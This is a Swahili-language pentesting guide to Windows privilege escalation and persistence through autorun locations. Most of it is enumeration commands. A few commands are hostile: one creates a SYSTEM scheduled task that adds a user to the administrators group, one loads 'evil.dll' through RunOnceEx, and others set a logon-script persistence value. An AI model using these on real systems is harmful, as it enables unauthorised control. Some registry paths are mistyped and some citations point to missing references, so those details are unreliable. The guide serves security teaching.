# Kuongeza Haki kwa kutumia Autoruns

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** inaweza kutumika kuendesha programu wakati wa **uanzishaji**. Angalia ni binaries zipi zimepangwa kuendeshwa wakati wa uanzishaji kwa kutumia:

```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```

## Kazi Zilizopangwa

**Kazi** zinaweza kuratibiwa kuendeshwa kwa **marudio maalum**. Tumia amri zifuatazo kuona ni binary zipi zilizopangwa kuendeshwa:

```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtasks.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Requires an elevated caller to register a task as SYSTEM
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```

Jukumu lililoundwa kwa `/sc ONLOGON /rl HIGHEST` huomba kiwango cha juu zaidi cha utekelezaji **kinachopatikana kwa principal iliyolisajili**; switch hiyo pekee haibadilishi principal hiyo wala kupita UAC. Mchakato wenye ruhusa za chini hauwezi kusajili jukumu la kiwango cha juu zaidi cha utekelezaji au kuchagua SYSTEM kama utambulisho wa jukumu hilo. Chukulia mfano ulio hapo juu kuwa ni kitendo cha mtumiaji ambaye tayari amepandishwa ruhusa, si njia ya mtumiaji wa kawaida kupata SYSTEM.<sup>[[8]](#references)</sup>

Jukumu lililowezeshwa linaloendeshwa kama SYSTEM linahitaji kukaguliwa hata kama ufafanuzi wa jukumu na faili la kitendo vinalindwa. [Task Scheduler inahitaji ruhusa ya kutekeleza jukumu ili kuliendesha unapohitaji](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks). Ikiwa mtumiaji mwenye ruhusa za chini ana ruhusa hiyo, kagua kitendo husika, hasa hati za PowerShell zinazobadilisha ACL za Active Directory au kuweka upya mipangilio ya ulinzi wa akaunti. Kagua mpangilio wa `AllowDemandStart` wa jukumu na uthibitishe ingizo na athari za hati hiyo; ruhusa ya kuanzisha jukumu lisilobadilika pekee haimaanishi uwezo wa kutekeleza msimbo wowote.

## Folda

Bainari zote zilizo kwenye **folda za Startup zitatekelezwa wakati wa kuwasha mfumo**. Folda za kawaida za Startup ni zile zilizoorodheshwa hapa chini, lakini folda ya Startup imeonyeshwa kwenye registry. [Soma hapa ili kujua ilipo.](privilege-escalation-with-autorun-binaries.md#startup-path)

```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```

Ingizo la Startup la mtumiaji mwenye privileges za juu linaweza kuanzisha script iliyolindwa ambayo hufungua mara kwa mara faili kutoka kwenye directory ambayo mtumiaji mwingine anaweza kuandikia. Kagua **utambulisho halisi wa mtumiaji wakati wa logon**, directory ya input ya script na ACL zake, pamoja na kitendo halisi kabla ya kuchukulia directory hiyo kama escalation path. Hasa, [`hh.exe` hufungua faili za HTML Help zilizokompailiwa (`.chm`)](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/htmlhelp/about-the-html-help-executable-program); script inayopitisha faili zilizotolewa na caller kwenda humo huvuka mpaka wa uaminifu wa maudhui hata kama inakagua jina la faili au byte za mwanzo. [Sera za HTML Help zinaweza kuzuia njia za mkato zinazotekelezeka](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/htmlhelp/system-policies-for-shortcut-and-winhelp-commands), kwa hiyo thibitisha sera iliyosakinishwa na tabia ya maudhui yanayoweza kufikiwa. Kiendelezi cha `.chm` au magic bytes pekee havithibitishi code execution kwa privileges za juu. Kagua autorun, command line ya mchakato, na ruhusa za path bila kufungua faili isiyoaminika wakati wa enumerating.

Mpaka huohuo wa maudhui upo pale mtu mwenye privileges za juu **anapofungua mwenyewe** faili ya `.chm` kutoka kwenye folder ya nyaraka ambayo mtumiaji mwingine anaweza kubadilisha. Thibitisha faili halisi na ruhusa za kuandika za directory mama, utambulisho halisi wa viewer na tukio la kufungua faili, pamoja na sera inayotumika ya HTML Help. Folder inayoweza kuandikiwa au ombi la kukagua nyaraka halithibitishi kwamba utambulisho wa juu ulifungua maudhui yaliyodhibitiwa na mshambuliaji.

> **TAARIFA**: Vulnerabilities za *path traversal* wakati wa kutoa archive (kama iliyotumiwa vibaya katika WinRAR kabla ya 7.13 – CVE-2025-8088) zinaweza kutumiwa **kuweka payload moja kwa moja ndani ya folder hizi za Startup wakati wa decompressing**, na kusababisha code execution mtumiaji atakapoingia tena. Kwa uchambuzi wa kina wa mbinu hii, tazama:


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## Registry

> [!TIP]
> [Dokezo kutoka hapa](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): Ingizo la registry la **Wow6432Node** linaonyesha kuwa unatumia toleo la Windows la 64-bit. Mfumo wa uendeshaji hutumia key hii kuonyesha mwonekano tofauti wa HKEY_LOCAL_MACHINE\SOFTWARE kwa programu za 32-bit zinazoendeshwa kwenye matoleo ya Windows ya 64-bit.

### Runs

**AutoRun zinazojulikana kwa kawaida**:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Registry keys zinazojulikana kama **Run** na **RunOnce** zimeundwa kuendesha programu kiotomatiki kila mtumiaji anapoingia kwenye mfumo. Command line iliyopewa thamani ya data ya key ina kikomo cha herufi 260 au chini yake.<sup>[[2]](#references)</sup>

**Runs za huduma** (zinaweza kudhibiti kuwashwa kiotomatiki kwa huduma wakati wa boot):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Katika Windows Vista na matoleo ya baadaye, registry keys za **Run** na **RunOnce** hazitengenezwi kiotomatiki. Entries katika keys hizi zinaweza kuanzisha programu moja kwa moja au kuzibainisha kama dependencies. Kwa mfano, ili kupakia faili ya DLL wakati wa logon, mtu anaweza kutumia registry key ya **RunOnceEx** pamoja na key ya "Depend". Hili linaonyeshwa kwa kuongeza ingizo la registry linaloendesha "C:\temp\evil.dll" wakati wa kuwasha mfumo:<sup>[[2]](#references)</sup>

```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```

> [!TIP]
> **Exploit 1**: Ikiwa unaweza kuandika ndani ya registry yoyote iliyotajwa ndani ya **HKLM**, unaweza kuongeza marupurupu mtumiaji mwingine anapoingia.

> [!TIP]
> **Exploit 2**: Ikiwa unaweza kubadilisha binary yoyote iliyoonyeshwa kwenye registry yoyote ndani ya **HKLM**, unaweza kurekebisha binary hiyo kwa backdoor mtumiaji mwingine anapoingia na kuongeza marupurupu.

```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```

### Njia ya Startup

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Shortcuts zilizowekwa kwenye folda ya **Startup** zitazindua huduma au programu kiotomatiki mtumiaji anapoingia au mfumo unapowashwa upya. Mahali ilipo folda ya **Startup** hufafanuliwa kwenye registry kwa wigo wa **Local Machine** na **Current User**. Hii inamaanisha kwamba shortcut yoyote inayoongezwa kwenye maeneo haya maalum ya **Startup** itahakikisha huduma au programu iliyounganishwa nayo inaanza baada ya mchakato wa kuingia au kuwasha upya, hivyo kuwa njia rahisi ya kupanga programu ziendeshe kiotomatiki.<sup>[[1]](#references)[[2]](#references)</sup>

> [!TIP]
> Ukiweza kubadilisha folda yoyote ya \[User] Shell chini ya **HKLM**, utaweza kuielekeza kwenye folda unayodhibiti na kuweka backdoor itakayoendeshwa mtumiaji yeyote anapoingia kwenye mfumo, na hivyo kuongeza haki zako.

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```

### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

Thamani hii ya registry ya kila mtumiaji inaweza kuelekeza kwenye script au amri inayotekelezwa mtumiaji huyo anapoingia. Hutumika hasa kama primitive ya **persistence** kwa sababu huendeshwa tu katika muktadha wa mtumiaji aliyeathiriwa, lakini bado inafaa kuikagua wakati wa post-exploitation na ukaguzi wa autoruns.<sup>[[3]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Ukiweza kuandika thamani hii kwa mtumiaji wa sasa, unaweza kuchochea tena utekelezaji mtumiaji anapoingia tena kwa njia shirikishi, bila kuhitaji haki za admin. Ukiweza kuiandika kwenye hive ya registry ya mtumiaji mwingine, unaweza kupata utekelezaji wa code mtumiaji huyo anapoingia.

```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```

Maelezo:

- Pendelea kutumia full paths za faili za `.bat`, `.cmd`, `.ps1` au faili nyingine za launcher ambazo target user anaweza tayari kusoma.
- Hii hudumu hadi thamani hiyo iondolewe, hata baada ya logoff/reboot.
- Tofauti na `HKLM\...\Run`, hii yenyewe haitoi elevation; ni persistence ya user-scope.

### Winlogon Keys

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Kwa kawaida, key ya **Userinit** huwekwa kuwa **userinit.exe**. Hata hivyo, key hii ikibadilishwa, executable iliyobainishwa pia itazinduliwa na **Winlogon** mtumiaji anapoingia. Vivyo hivyo, key ya **Shell** inapaswa kuelekeza kwenye **explorer.exe**, ambayo ndiyo shell chaguomsingi ya Windows.<sup>[[1]](#references)</sup>

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```

> [!TIP]
> Ukiweza kubadilisha thamani ya registry au binary, utaweza kupandisha kiwango cha ruhusa.

### Mipangilio ya Sera

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Kagua key ya **Run**.

```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```

### AlternateShell

### Kubadilisha Command Prompt ya Safe Mode

Katika Windows Registry chini ya `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, kuna thamani ya **`AlternateShell`** ambayo kwa chaguo-msingi imewekwa kuwa `cmd.exe`. Hii inamaanisha kuwa unapochagua "Safe Mode with Command Prompt" wakati wa kuwasha kompyuta (kwa kubonyeza F8), `cmd.exe` hutumika. Hata hivyo, inawezekana kusanidi kompyuta yako iwake kiotomatiki katika hali hii bila kuhitaji kubonyeza F8 na kuichagua mwenyewe.

Hatua za kuunda chaguo la kuwasha kompyuta kiotomatiki katika "Safe Mode with Command Prompt":<sup>[[5]](#references)</sup>

1. Badilisha sifa za faili ya `boot.ini` ili kuondoa alama za read-only, system na hidden: `attrib c:\boot.ini -r -s -h`
2. Fungua `boot.ini` ili kuihariri.
3. Ongeza mstari kama huu: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Hifadhi mabadiliko kwenye `boot.ini`.
5. Rejesha sifa asili za faili: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** Kubadilisha ufunguo wa **AlternateShell** kwenye Registry huruhusu usanidi wa custom command shell, jambo linaloweza kutumiwa kupata ufikiaji usioidhinishwa.
- **Exploit 2 (Ruhusa za Kuandika za PATH):** Kuwa na ruhusa za kuandika kwenye sehemu yoyote ya kigezo cha mfumo **PATH**, hasa kabla ya `C:\Windows\system32`, hukuwezesha kuendesha `cmd.exe` maalum. Hii inaweza kuwa backdoor ikiwa mfumo utawashwa katika Safe Mode.
- **Exploit 3 (Ruhusa za Kuandika za PATH na boot.ini):** Ufikiaji wa kuandika kwenye `boot.ini` huwezesha kuwasha Safe Mode kiotomatiki, na hivyo kurahisisha ufikiaji usioidhinishwa wakati wa kuwasha upya kunakofuata.

Ili kuangalia mpangilio wa sasa wa **AlternateShell**, tumia amri hizi:

```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```

### Kipengele Kilichosakinishwa

Active Setup ni kipengele cha Windows ambacho **huanza kabla mazingira ya desktop hayajapakiwa kikamilifu**. Hupa kipaumbele utekelezaji wa amri fulani, ambazo lazima zikamilike kabla ya kuendelea na kuingia kwa mtumiaji. Mchakato huu hutokea hata kabla maingizo mengine ya uanzishaji, kama yale yaliyo katika sehemu za Run au RunOnce za registry, hayajaanzishwa.

Active Setup hudhibitiwa kupitia funguo zifuatazo za registry:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Ndani ya funguo hizi, kuna funguo ndogo mbalimbali, kila moja ikihusiana na kipengele maalum. Thamani za funguo zinazovutia zaidi ni pamoja na:

- **IsInstalled:**
  - `0` inaonyesha kuwa amri ya kipengele haitatekelezwa.
  - `1` ina maana kwamba amri itatekelezwa mara moja kwa kila mtumiaji. Hii ndiyo tabia chaguomsingi ikiwa thamani ya `IsInstalled` haipo.
- **StubPath:** Hufafanua amri itakayotekelezwa na Active Setup. Inaweza kuwa mstari wowote halali wa amri, kama vile kuanzisha `notepad`.

**Mambo ya Kuzingatia Kuhusu Usalama:**

- Kurekebisha au kuandika kwenye ufunguo wenye **`IsInstalled`** iliyowekwa kuwa `"1"` na **`StubPath`** maalum kunaweza kusababisha utekelezaji wa amri bila idhini, na huenda kukatumiwa kwa privilege escalation.
- Kubadilisha faili ya binary inayorejelewa katika thamani yoyote ya **`StubPath`** kunaweza pia kusababisha privilege escalation, ikiwa kuna ruhusa za kutosha.

Ili kukagua mipangilio ya **`StubPath`** katika vipengele vyote vya Active Setup, amri hizi zinaweza kutumika:

```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```

### Browser Helper Objects

### Muhtasari wa Browser Helper Objects (BHOs)

Browser Helper Objects (BHOs) ni moduli za DLL zinazoongeza vipengele vya ziada kwenye Internet Explorer ya Microsoft. Hupakiwa kwenye Internet Explorer na Windows Explorer kila zinapoanzishwa. Hata hivyo, utekelezaji wake unaweza kuzuiwa kwa kuweka key ya **NoExplorer** kuwa 1, na hivyo kuzizuia kupakiwa pamoja na instances za Windows Explorer.<sup>[[1]](#references)</sup>

BHOs zinaendana na Windows 10 kupitia Internet Explorer 11, lakini hazitumiki kwenye Microsoft Edge, kivinjari chaguo-msingi katika matoleo mapya zaidi ya Windows.

Ili kuchunguza BHOs zilizosajiliwa kwenye mfumo, unaweza kukagua registry keys zifuatazo:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Kila BHO huwakilishwa na **CLSID** yake kwenye registry, ambayo hutumika kama kitambulisho cha kipekee. Maelezo ya kina kuhusu kila CLSID yanaweza kupatikana chini ya `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Ili kutafuta BHOs kwenye registry, unaweza kutumia amri hizi:

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```

### Viendelezi vya Internet Explorer

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Kumbuka kuwa registry itakuwa na ingizo jipya la registry kwa kila dll, na litaonyeshwa na **CLSID**. Unaweza kupata maelezo ya CLSID katika `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Viendeshi vya Fonti

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```

### Amri ya kufungua

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`

```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```

### Vishughulikiaji vya COM vya menyu ya muktadha

Vishughulikiaji vya menyu ya muktadha vya Explorer ni viendelezi vya shell vilivyosajiliwa chini ya keys kama `HKLM\SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers` na `HKLM\SOFTWARE\Classes\Folder\shellex\ContextMenuHandlers`. Thamani chaguomsingi ya handler, au wakati mwingine jina lake la key, ni CLSID. Fuatilia CLSID hiyo hadi `HKLM\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32`; thamani yake chaguomsingi hutaja DLL inayopakiwa handler inapoanzishwa.

```powershell
reg query "HKLM\SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers" /s
reg query "HKLM\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32" /ve
Get-Acl 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32' |
  Select-Object -ExpandProperty Access
```

Angalia mitazamo yote miwili ya registry ya biti 32 na biti 64. `HKCR` huunganisha usajili wa madarasa wa kila mtumiaji na wa mfumo mzima, kwa hiyo thibitisha ni ufunguo upi wa msingi ambao mchakato utatumia. Utambulisho wenye ruhusa ndogo unaoweza kubadilisha thamani ya `InprocServer32` ya mfumo mzima unaweza kuelekeza mchakato wenye ruhusa zaidi kwenye DLL nyingine, lakini kupandisha ruhusa kunahitaji mchakato huo kutumia handler. Njia ya DLL inayoweza kuandikwa inaweza kuleta hatari kama hiyo hata kama thamani ya registry yenyewe inalindwa.

### Image File Execution Options

```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```

## SysInternals

Kumbuka kwamba maeneo yote ambapo unaweza kupata autoruns **tayari yamechunguzwa na**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Hata hivyo, ili kupata orodha **kamili zaidi ya faili zinazoendeshwa kiotomatiki**, unaweza kutumia [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)kutoka systinternals:

```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```

## Zaidi

**Pata Autoruns zaidi kama vile rejista katika** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)<sup>[[4]](#references)</sup>

## References

- [1] [Mbinu za kawaida za malware kujidumisha](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [2] [MITRE ATT&CK T1547.001 – Utekelezaji wa kujiendesha wakati wa kuwasha au kuingia: Vifunguo vya Registry Run / Folda ya Startup](https://attack.mitre.org/techniques/T1547/001/)
- [3] [MITRE ATT&CK T1037.001 – Skripti za uanzishaji wakati wa kuwasha au kuingia: Skripti ya kuingia (Windows)](https://attack.mitre.org/techniques/T1037/001/)
- [4] [Autoruns – Kategoria za Autostart (Utatuzi wa matatizo kwa kutumia zana za Windows Sysinternals, Toleo la 2)](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
